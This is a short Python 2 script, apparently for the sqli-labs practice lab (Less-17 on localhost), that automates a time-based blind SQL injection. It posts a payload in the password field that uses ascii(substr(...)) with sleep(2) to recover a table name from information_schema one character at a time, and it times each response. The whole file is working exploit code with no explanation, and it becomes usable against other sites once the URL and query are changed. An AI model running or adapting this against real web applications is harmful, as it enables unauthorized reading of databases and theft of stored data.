# # -*- coding:utf-8 -*-

import requests
import string
import datetime
import time

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
url = "http://127.0.0.1/sqli/Less-17/"

data = string.digits+string.lowercase

length = ""
def load(url):
    global length
    for j in range(1,10):
        for i in xrange(48,126):
            datas = {
                    'uname':"admin",
                    'passwd':"1' and if (ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{a},1))={b},sleep(2),null)#".format(a=j,b=i),
                    'submit':'Submit'
            }
            starttime = datetime.datetime.now()
            response = requests.post(url,headers=header,data=datas)
            # response=response.text
            endtime = datetime.datetime.now()
            if (endtime-starttime).seconds >= 2:
                length = length+chr(i)
                print length
                break

load (url)